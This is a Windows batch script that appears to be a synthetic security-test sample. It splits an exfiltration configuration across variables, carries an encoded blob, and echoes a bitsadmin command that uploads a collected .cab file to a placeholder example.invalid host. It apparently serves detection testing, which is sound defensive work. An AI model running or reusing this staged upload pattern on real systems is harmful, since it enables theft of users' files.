@echo off

setlocal EnableExtensions EnableDelayedExpansion

rem HUNTRESS-CODEC:plain_fragments|rotate_left

rem HUNTRESS-MATERIAL:7Hpi+OboyuDmetjexsLoyr7Y3sbC2Fjg5MrgwuTKvujkwtzmzMrkWOrg2N7CyL7kytre6Mr4wsjC4OjK5HrE0ujmwsja0txcyvDK+Obows7Kvsbe6tzoemL4zuTC4NB6zMLY2MTCxta+5Mro5PL43Mrw6L7YwtzO6sLOynrc3tzK+MbC2uDC0s7cvtLIesbC2uDC0s7cWmZobmzGbmbKbmz45t7q5MbKvuDC6NB6hnS4qubK5Oa4oOrE2NLGuJDq3OjkyubmmMLEuMbe2NjKxuhaZmhubMZuZspubFzGwsT46uDY3sLIvurk2HrQ6Ojg5nReXmZobmzGbmbKbmxcyvDC2uDYylzS3OzC2NLIXurg2N7CyA==

rem HUNTRESS-EXTENSION:cmd

if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT

if /i "%~1"=="--plan" goto :HUNTRESS_PLAN

exit /b 0

:HUNTRESS_INSPECT

set h0=v=1^|steps=locate_local,prepare_transfer,upload_remote^|adapter=bitsadmi
set h1=n.exe^|stage_count=1^|graph=fallback_retry^|next_language=none^|campaign_i
set h2=d=campaign-3476c73e76^|source_path=C:\Users\Public\HuntressLab\collect-
set h3=3476c73e76.cab^|upload_url=https://3476c73e76.example.invalid/upload

goto :HUNTRESS_SEPARATOR_DONE
ver >nul & rem HUNTRESS separator ampersand
:HUNTRESS_SEPARATOR_DONE

set "neutral_environment_probe=28b07b2d"

call :HUNTRESS_RECOVER
goto :HUNTRESS_EMIT
:HUNTRESS_RECOVER
set "cfg=!h0!!h1!!h2!!h3!"
exit /b 0
:HUNTRESS_EMIT

echo(!cfg!

exit /b 0

:HUNTRESS_PLAN

echo bitsadmin.exe upload C:\Users\Public\HuntressLab\collect-3476c73e76.cab to https://3476c73e76.example.invalid/upload

exit /b 0

